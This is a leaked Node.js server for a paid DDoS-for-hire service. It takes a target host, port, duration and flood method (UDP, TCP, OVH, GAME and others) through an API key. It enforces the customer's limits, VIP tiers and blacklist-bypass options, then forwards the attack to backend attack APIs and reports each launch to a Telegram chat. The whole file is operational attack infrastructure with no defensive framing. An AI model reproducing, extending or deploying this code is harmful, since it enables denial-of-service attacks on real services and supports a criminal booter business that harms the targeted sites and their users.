const express = require("express");
const http = require("http");
const axios = require("axios");
const fs = require("fs");
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('token ur', { polling: true });
const app = express();
const allapis = JSON.parse(fs.readFileSync("apis.json"));
let apiKeys = JSON.parse(fs.readFileSync("api_keys.json"));

let attackSlots = 0; 
// leak by t.me/leakddosmethods
const maxAttackSlots = 100; 
const activeAttacks = [];
const blockedPrefixes = ["fbi", "interpol", "youtube"];
const blacklist = fs.readFileSync("blacklist.txt", "utf-8").split("\n").map((line) => line.trim()).filter((line) => line !== "");

function isValidPort(port) {
  const portNumber = parseInt(port);
  return Number.isInteger(portNumber) && portNumber >= 1 && portNumber <= 65535;
}

function isKeyExpired(key) {
  const expireDate = new Date(apiKeys[key].expire);
  const currentDate = new Date();
  return currentDate > expireDate;
}

function removeExpiredKeys() {
  for (const key in apiKeys) {
    if (isKeyExpired(key)) {
      delete apiKeys[key];
    }
  }
  fs.writeFileSync("api_keys.json", JSON.stringify(apiKeys, null, 2));
}

function getRunningAttacks(apiKey) {
  const activeAttacksForApiKey = activeAttacks[apiKey] || [];
  const runningAttacksCount = activeAttacksForApiKey.filter(
    (attack) => new Date().getTime() - attack.startTime < attack.duration
  ).length;
  const maxConcurrentAttacks = apiKeys[apiKey].maxConcurrentAttacks;
  return `${runningAttacksCount}/${maxConcurrentAttacks}`;
}

function sendTelegramMessageToGroup(chatId, message) {
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
}

function getAvailableAttackSlots(apiKey) {
  const maxConcurrentAttacks = apiKeys[apiKey].maxConcurrentAttacks;
  const activeAttacksForApiKey = activeAttacks[apiKey] || [];
  const runningAttacksCount = activeAttacksForApiKey.filter(
    (attack) => new Date().getTime() - attack.startTime < attack.duration
  ).length;

  const availableSlots = Math.max(0, maxConcurrentAttacks - runningAttacksCount + (maxAttackSlots - attackSlots));
  
  return availableSlots;
}

app.get("/api/attack", async (req, res) => {
  const host = req.query.host;
  const port = req.query.port;
  const time = req.query.time;
  const method = req.query.method;
  const apiKey = req.query.key;

  if (!(host && port && time && method && apiKey))
    return res.send({ error: true, message: "Missing parameters." });

  if (!isValidPort(port))
    return res.send({ error: true, message: "Invalid port, try again." });

if ((method === 'UDP' || method === 'TCP' || method === 'PUDP' || method === 'OVH' || method === 'TFO' || method === 'GAME' || method === 'UDP-VIP' || method === 'SOCKET') && time > 600) {
  return res.send({ error: true, message: `Max time for this ${method} - 600 seconds.` });
}

  if (method === "UDP-VIP" && !apiKeys[apiKey]["Vip access"])
    return res.send({ error: true, message: "You can't use this method. You need to buy Vip access!" });

  const apiLimits = apiKeys[apiKey];

  if (!apiLimits)
    return res.send({ error: true, message: "Invalid API key." });

  if (apiLimits.maxAttackTime < parseInt(time))
    return res.send({ error: true, message: "Attack time exceeds limit." });

  const isBlocked = blockedPrefixes.some(prefix => host.includes(prefix));
  if (isBlocked) {
    return res.send({ error: true, message: "This target is blacklisted." });
  }
  
if (apiKeys[apiKey].slotbypass && apiKeys[apiKey].slotbypass === true) {
  
} else {
  
  if (attackSlots >= maxAttackSlots) {
    return res.send({ error: true, message: "Max attack slots of 20 are in use" });
  }
  attackSlots++;
}

  const logMessage = `[${new Date().toLocaleString()}] Launching attack: ${host} ${port} ${time} ${method}\nAPI key - ${apiKey}\n`;
  fs.appendFile("logs.txt", logMessage, (err) => {
    if (err) console.error("Error writing to logs.txt:", err);
  });

  const currentTime = new Date().getTime();
  let activeAttacksForApiKey = activeAttacks[apiKey] || [];
  activeAttacksForApiKey = activeAttacksForApiKey.filter(
    (attack) => currentTime - attack.startTime < attack.duration
  );
  
  if (apiLimits.maxConcurrentAttacks <= activeAttacksForApiKey.length)
    return res.send({
      error: true,
      message: "Concurrent attacks limit exceeded.",
    });

  if (apiLimits.powersaving) {
    const existingAttack = activeAttacksForApiKey.find(
      (attack) => attack.target === host
    );
    if (existingAttack)
      return res.send({
        error: true,
        message: "An attack on this target is already in progress.",
      });
  }

  const apiKeyInfo = apiKeys[apiKey];

  if (!apiKeyInfo)
    return res.send({ error: true, message: "Invalid API key." });

  const blacklistBypass = apiKeyInfo.blacklistbypass;

  if (!blacklistBypass && blacklist.includes(host))
    return res.send({ error: true, message: "This target is blacklisted." });

  activeAttacksForApiKey.push({
    startTime: currentTime,
    duration: parseInt(time * 1000),
    target: host,
  });
  
  activeAttacks[apiKey] = activeAttacksForApiKey;

// send logs to your telegram chat
const chatId = '-4044137161'; // ur telegram chat id u will get it with t.me/cid_bot help just invite in ur chat

sendTelegramMessageToGroup(chatId, `New attack started:

**__Target:__** ${host}
**__Port:__** ${port}
**__Time:__** ${time}
**__Method:__ ${method}
**__Key:__ ${apiKey}`);
  
setTimeout(() => {
  const attackIndex = activeAttacksForApiKey.findIndex(a => a.target === host);
  if (attackIndex !== -1) {
    activeAttacksForApiKey.splice(attackIndex, 1);
    console.log(`[${new Date().toLocaleString()}] Attack ended on: ${host}`);
    attackSlots--;
  }
}, parseInt(time * 1000));

  if (!allapis[method])
    return res.send({ error: true, message: "Invalid method." });

  const apiUrls = Array.isArray(allapis[method].api)
    ? allapis[method].api
    : [allapis[method].api];

  const attackPromises = apiUrls.map((apiUrl) => {
    const replacedUrl = apiUrl
      .replace("<<$host>>", host)
      .replace("<<$port>>", port)
      .replace("<<$time>>", time);
    return axios.get(replacedUrl);
  });

  try {
  
  const availableSlots = getAvailableAttackSlots(apiKey);
const jsonResponse = {
  error: false,
  host: host,
  method: method,
  port: port,
  time: time,
  user_ongoing: getRunningAttacks(apiKey),
  available_slots: `${availableSlots}/${maxAttackSlots}`,
};
 
    res.send(jsonResponse);
    
  const attackResults = await Promise.all(attackPromises);
  console.log("Attack successful:", req.protocol + "://" + req.get("host") + req.originalUrl);
  console.log("API key:", apiKey);

  const responseText = `
      <!DOCTYPE html><html><head><title>INFO</title></head><body style="background-color: gray; color: white;">
      <div style='padding: 100px;'>
      <h1 style='color: green;'>[🚀] Attack sent succesfully! [🚀]</h1>
      <p style='color: yellow;'>Host: <span style='color: yellow;'>${host}</span></p>
      <p style='color: yellow;'>Port: <span style='color: yellow;'>${port}</span></p>
      <p style='color: yellow;'>Time: <span style='color: yellow;'>${time}</span></p>
      <p style='color: yellow;'>Method: <span style='color: yellow;'>${method}</span></p>
      <p style='color: yellow;'>User Ongoing: <span style='color: yellow;'>${getRunningAttacks(apiKey)}</span></p>
      </div>
      </body></html>`;
    res.send(responseText);
    
} catch (error) {

  if (error.code === 'ENOTFOUND') {
   const jsonResponse = {
    error: false,
    host: host,
    method: method,
    port: port,
    time: time,
    user_ongoing: getRunningAttacks(apiKey),
 }; 
 
    res.send(jsonResponse);
  } else if (error.code !== 'ECONNREFUSED') {
    res.status(500).send({ error: true, message: "Internal Server Error." });
  }

  console.log(`[${new Date().toLocaleString()}] Attack sent to: ${host}:${port} on ${time} seconds using ${method} by - ${apiKey}`);
  
setTimeout(() => {
  const attackIndex = activeAttacksForApiKey.findIndex(a => a.target === host);
  if (attackIndex !== -1) {
    activeAttacksForApiKey.splice(attackIndex, 1);
    console.log(`[${new Date().toLocaleString()}] Attack ended on: ${host}`);
  }

  attackSlots--;
}, parseInt(time * 1000));
}
});

app.listen("999", () => {
  console.log(`Example app listening on port 999`);
});

process.on("uncaughtException", (err) => (""));
process.on("unhandledRejection", (err) => (""));

removeExpiredKeys();

setInterval(removeExpiredKeys, 60000);